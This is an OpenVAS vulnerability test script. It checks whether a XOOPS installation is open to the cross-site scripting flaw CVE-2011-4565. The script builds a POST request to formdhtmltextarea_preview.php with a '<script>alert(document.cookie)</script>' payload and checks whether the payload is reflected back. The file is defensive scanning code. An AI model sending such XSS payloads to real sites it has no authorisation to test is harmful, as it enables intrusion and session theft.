###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_xoops_text_param_mult_xss_vuln.nasl 3507 2016-06-14 04:32:30Z ckuerste $
#
# XOOPS 'text' and 'message' Parameter Cross-Site Scripting Vulnerabilities
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the
  context of an affected site.
  Impact Level: Application";
tag_affected = "XOOPS version 2.5.1a and prior";
tag_insight = "The flaws are due to improper validation of user-supplied input to
  - The 'text' parameter to include/formdhtmltextarea_preview.php (when 'html'
    is set to '1'),
  - The '[img]' BBCode tag in the 'message' parameter to pmlite.php script,
    which allows attacker to execute arbitrary HTML and script code on the
    user's browser session in the security context of an affected site.";
tag_solution = "Upgrade to XOOPS version 2.5.3 or later,
  For updates refer to http://www.xoops.org/";
tag_summary = "The host is running XOOPS and is prone to cross site scripting
  vulnerabilities.";

if(description)
{
  script_id(802351);
  script_version("$Revision: 3507 $");
  script_cve_id("CVE-2011-4565");
  script_bugtraq_id(49995);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2016-06-14 06:32:30 +0200 (Tue, 14 Jun 2016) $");
  script_tag(name:"creation_date", value:"2011-12-05 15:17:25 +0530 (Mon, 05 Dec 2011)");
  script_name("XOOPS 'text' and 'message' Parameter Cross-Site Scripting Vulnerabilities");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/46238");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/70377");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/70378");
  script_xref(name : "URL" , value : "http://xoops.org/modules/news/article.php?storyid=6094");
  script_xref(name : "URL" , value : "https://www.htbridge.ch/advisory/multiple_xss_in_xoops_web_application_platform.html");

  script_tag(name:"qod_type", value:"remote_vul");
  script_summary("Check if XOOPS is vulnerable to XSS");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_xoops_detect.nasl");
  script_require_ports("Services/www", 80);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Get the HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)) {
  exit(0);
}

## Get the version from KB
dir = get_dir_from_kb(port:port,app:"XOOPS");
if(!dir){
  exit(0);
}

##Get Host name
host = get_host_name();
if(!host){
  exit(0);
}

## Construct the Attack Request
url = dir + "/include/formdhtmltextarea_preview.php";

## Construct the POST data
postdata = "html=1&text=<script>alert(document.cookie)</script>";

## Construct the POST request
req = string("POST ", url, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "User-Agent:  XSS-TEST\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: ", strlen(postdata), "\r\n",
             "\r\n", postdata);

## Try XSS Attack
res = http_keepalive_send_recv(port:port, data:req);

## Confirm exploit worked by checking the response
if(res =~ "HTTP/1\.. 200" && "<script>alert(document.cookie)</script>" >< res){
  security_message(port);
}
